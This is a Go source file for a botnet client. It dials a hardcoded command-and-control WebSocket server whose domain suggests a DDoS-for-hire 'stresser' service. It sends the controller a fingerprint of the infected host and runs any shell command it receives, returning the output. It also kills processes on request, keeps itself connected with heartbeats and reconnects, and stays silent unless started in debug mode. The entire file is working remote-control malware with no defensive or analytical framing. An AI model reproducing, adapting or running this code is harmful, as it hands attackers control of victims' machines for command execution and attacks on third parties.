package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

// Config
var (
	controllerURL     = envOrDefault("CONTROLLER_URL", "wss://botnet.atlastresser.site/connect")
	reconnectDelay    = 5 * time.Second
	heartbeatInterval = 20 * time.Second
	debug             = contains(os.Args, "--debug")
)

// BotInfo holds system information
type BotInfo struct {
	Hostname string  `json:"hostname"`
	Platform string  `json:"platform"`
	Arch     string  `json:"arch"`
	CPUs     int     `json:"cpus"`
	CPUModel string  `json:"cpuModel"`
	TotalMem uint64  `json:"totalMem"`
	FreeMem  uint64  `json:"freeMem"`
	Version  string  `json:"version"`
	PID      int     `json:"pid"`
	Uptime   float64 `json:"uptime"`
}

// Message represents WebSocket messages
type Message struct {
	Type  string      `json:"type"`
	BotID string      `json:"botId,omitempty"`
	Cmd   string      `json:"cmd,omitempty"`
	Args  string      `json:"args,omitempty"`
	Data  interface{} `json:"data,omitempty"`
}

// Result holds command execution results
type Result struct {
	Cmd      string `json:"cmd"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	Error    string `json:"error"`
	ExitCode int    `json:"exitCode"`
}

var (
	ws             *websocket.Conn
	botID          string
	heartbeatTimer *time.Ticker
	reconnectTimer *time.Timer
	isConnecting   bool
)

func envOrDefault(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func logDebug(color, msg string, args ...interface{}) {
	if !debug {
		return
	}
	colors := map[string]string{
		"green":  "\033[32m",
		"red":    "\033[31m",
		"yellow": "\033[33m",
		"cyan":   "\033[36m",
		"dim":    "\033[2m",
	}
	c := colors[color]
	reset := "\033[0m"
	formatted := fmt.Sprintf(msg, args...)
	fmt.Printf("%s%s%s\n", c, formatted, reset)
}

func getBotInfo() BotInfo {
	hostname, _ := os.Hostname()

	var cpuModel string
	if runtime.GOOS == "linux" {
		if out, err := exec.Command("cat", "/proc/cpuinfo").Output(); err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "model name") {
					parts := strings.SplitN(line, ":", 2)
					if len(parts) == 2 {
						cpuModel = strings.TrimSpace(parts[1])
						break
					}
				}
			}
		}
	} else if runtime.GOOS == "windows" {
		if out, err := exec.Command("wmic", "cpu", "get", "name", "/format:list").Output(); err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "Name=") {
					cpuModel = strings.TrimSpace(strings.TrimPrefix(line, "Name="))
					break
				}
			}
		}
	}
	if cpuModel == "" {
		cpuModel = "unknown"
	}

	var totalMem, freeMem uint64
	if runtime.GOOS == "linux" {
		if out, err := exec.Command("cat", "/proc/meminfo").Output(); err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "MemTotal:") {
					fmt.Sscanf(line, "MemTotal: %d kB", &totalMem)
					totalMem *= 1024
				}
				if strings.HasPrefix(line, "MemAvailable:") {
					fmt.Sscanf(line, "MemAvailable: %d kB", &freeMem)
					freeMem *= 1024
				}
			}
		}
	}

	return BotInfo{
		Hostname: hostname,
		Platform: runtime.GOOS,
		Arch:     runtime.GOARCH,
		CPUs:     runtime.NumCPU(),
		CPUModel: cpuModel,
		TotalMem: totalMem,
		FreeMem:  freeMem,
		Version:  runtime.Version(),
		PID:      os.Getpid(),
		Uptime:   time.Since(bootTime()).Seconds(),
	}
}

func bootTime() time.Time {
	if runtime.GOOS == "linux" {
		if out, err := exec.Command("uptime", "-s").Output(); err == nil {
			if t, err := time.Parse("2006-01-02 15:04:05", strings.TrimSpace(string(out))); err == nil {
				return t
			}
		}
	}
	return time.Now().Add(-time.Hour) // fallback
}

func runCmd(cmd string) Result {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd"
		flag = "/C"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	command := exec.Command(shell, flag, cmd)
	output, err := command.CombinedOutput()

	result := Result{
		Cmd:    cmd,
		Stdout: strings.TrimSpace(string(output)),
	}

	if err != nil {
		result.Error = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			result.ExitCode = exitErr.ExitCode()
		} else {
			result.ExitCode = 1
		}
	}

	return result
}

func clearTimers() {
	if heartbeatTimer != nil {
		heartbeatTimer.Stop()
		heartbeatTimer = nil
	}
	if reconnectTimer != nil {
		reconnectTimer.Stop()
		reconnectTimer = nil
	}
}

func scheduleReconnect() {
	clearTimers()
	reconnectTimer = time.AfterFunc(reconnectDelay, connect)
}

func startHeartbeat(conn *websocket.Conn) {
	if heartbeatTimer != nil {
		heartbeatTimer.Stop()
	}
	heartbeatTimer = time.NewTicker(heartbeatInterval)
	go func() {
		for range heartbeatTimer.C {
			if conn != nil {
				msg := Message{Type: "heartbeat", BotID: botID}
				data, _ := json.Marshal(msg)
				conn.WriteMessage(websocket.TextMessage, data)
			}
		}
	}()
}

func sendInfo(conn *websocket.Conn) {
	msg := Message{
		Type:  "info",
		BotID: botID,
		Data:  getBotInfo(),
	}
	data, _ := json.Marshal(msg)
	conn.WriteMessage(websocket.TextMessage, data)
}

func connect() {
	if isConnecting {
		return
	}
	isConnecting = true
	logDebug("dim", "[~] connecting to %s ...", controllerURL)

	dialer := websocket.DefaultDialer
	dialer.HandshakeTimeout = 10 * time.Second

	conn, _, err := dialer.Dial(controllerURL, nil)
	if err != nil {
		logDebug("red", "[✗] dial error → %s", err.Error())
		isConnecting = false
		scheduleReconnect()
		return
	}

	ws = conn
	isConnecting = false
	logDebug("green", "[+] connected to controller — waiting for handshake...")

	// Start read loop
	go readLoop(conn)
}

func readLoop(conn *websocket.Conn) {
	defer func() {
		clearTimers()
		isConnecting = false
		logDebug("yellow", "[-] disconnected — reconnecting in %vs...", reconnectDelay.Seconds())
		conn.Close()
		scheduleReconnect()
	}()

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			logDebug("red", "[✗] read error → %s", err.Error())
			return
		}

		var msg Message
		if err := json.Unmarshal(message, &msg); err != nil {
			continue
		}

		switch msg.Type {
		case "handshake":
			botID = msg.BotID
			logDebug("green", "[✓] handshake ok — botId: %s", botID)
			sendInfo(conn)
			startHeartbeat(conn)

		case "pong":
			logDebug("dim", "[♥] pong received")

		case "cmd":
			if msg.Cmd == "shell" && msg.Args != "" {
				logDebug("cyan", "[»] cmd received → %s", msg.Args)
				result := runCmd(msg.Args)
				logDebug("cyan", "[«] result → exit:%d | %s", result.ExitCode, truncate(result.Stdout, 80))

				resp := Message{
					Type:  "result",
					BotID: botID,
					Data:  result,
				}
				data, _ := json.Marshal(resp)
				conn.WriteMessage(websocket.TextMessage, data)
			}

			if msg.Cmd == "stopshell" && msg.Args != "" {
				scriptName := msg.Args
				var killCmd string
				if runtime.GOOS == "windows" {
					killCmd = fmt.Sprintf(`wmic process where "commandline like '%%%s%%'" delete`, scriptName)
				} else {
					killCmd = fmt.Sprintf(`pkill -f "%s"`, scriptName)
				}
				logDebug("yellow", "[✕] stopshell → killing: %s", scriptName)
				result := runCmd(killCmd)
				logDebug("yellow", "[✕] killed exit:%d", result.ExitCode)

				resp := Message{
					Type:  "result",
					BotID: botID,
					Data: Result{
						Cmd:      "stopshell",
						Stdout:   result.Stdout,
						Stderr:   result.Stderr,
						Error:    result.Error,
						ExitCode: result.ExitCode,
					},
				}
				data, _ := json.Marshal(resp)
				conn.WriteMessage(websocket.TextMessage, data)
			}

		case "kill":
			logDebug("red", "[!] kill signal received — exiting...")
			conn.Close()
			os.Exit(0)

		case "getinfo":
			logDebug("dim", "[i] getinfo requested — sending...")
			sendInfo(conn)
		}
	}
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max]
}

func main() {
	// Suppress output when not in debug mode
	if !debug {
		log.SetOutput(nil)
	} else {
		fmt.Printf("\n  \033[1m\033[35m[bots.go]\033[0m debug mode enabled\n\n")
	}

	connect()

	// Keep main goroutine alive
	select {}
}
